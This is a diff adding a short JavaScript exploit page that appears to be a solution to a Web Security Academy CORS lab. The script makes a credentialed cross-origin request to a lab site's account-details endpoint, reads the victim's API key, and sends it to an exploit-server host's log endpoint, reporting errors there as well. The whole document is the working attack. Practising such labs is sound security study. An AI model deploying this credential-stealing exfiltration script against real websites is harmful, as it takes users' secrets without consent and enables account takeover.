@@ -1,0 +1,24 @@
+<script>
+    const vulnerable_url = "https://LAB-ID.web-security-academy.net/accountDetails";
+    const malicious_url = "https://exploit-EXPLOIT-LAB-ID.exploit-server.net";
+
+    try {
+        (async () => {
+            const headers = {
+                "Origin": malicious_url
+            }
+
+            const options = {
+                credentials: "include",
+                headers: headers
+            }
+
+            const response = await fetch(vulnerable_url, options);
+            const { apikey } = await response.json();
+
+            fetch(`${malicious_url}/log?data=${apikey}`);
+        })();
+    } catch (err) {
+        fetch(`${malicious_url}/log?data=${err}`);
+    }
+</script>
